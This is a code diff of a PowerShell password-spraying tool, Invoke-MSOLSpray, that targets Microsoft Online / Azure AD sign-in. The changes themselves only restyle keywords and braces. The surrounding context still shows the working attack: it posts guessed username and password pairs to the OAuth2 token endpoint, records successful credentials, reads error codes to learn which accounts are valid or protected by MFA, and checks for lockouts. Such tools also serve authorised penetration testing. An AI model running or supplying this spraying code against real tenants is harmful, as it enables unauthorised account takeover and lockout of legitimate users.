@@ -92,10 +92,9 @@ function Invoke-MSOLSpray {
 
     $ErrorActionPreference = 'silentlycontinue'
 
-    if ($UserName -ne '') {
+    If ($UserName -ne '') {
         $Usernames = $UserName
-    }
-    else {
+    } Else {
         $Usernames = Get-Content $UserList
     }
     $count = $Usernames.count
@@ -118,7 +117,7 @@ function Invoke-MSOLSpray {
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid' }
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }
-        if ($Delay) {
+        If ($Delay) {
             Start-Sleep -Seconds $Delay
         }
         $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
@@ -128,8 +127,7 @@ function Invoke-MSOLSpray {
             Write-Host -ForegroundColor 'green' "[*] SUCCESS! $username : $password"
             $webrequest = ''
             $fullresults += "$username : $password"
-        }
-        else {
+        } Else {
             # Check the response for indication of MFA, tenant, valid user, etc...
             # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
             # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
@@ -194,7 +192,7 @@ function Invoke-MSOLSpray {
         }
 
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
-        if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0) {
+        If (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0) {
             $title = 'WARNING! Multiple Account Lockouts Detected!'
             $message = '10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?'
 
@@ -208,7 +206,7 @@ function Invoke-MSOLSpray {
 
             $result = $host.ui.PromptForChoice($title, $message, $options, 0)
             $lockoutquestion++
-            if ($result -ne 0) {
+            If ($result -ne 0) {
                 Write-Host '[*] Cancelling the password spray.'
                 Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                 break
@@ -218,8 +216,7 @@ function Invoke-MSOLSpray {
     }
 
     # Output to file
-    if ($OutFile -ne "")
-    {
+    If ($OutFile -ne "") {
         If ($fullresults)
         {
         $fullresults | Out-File -Encoding ascii $OutFile
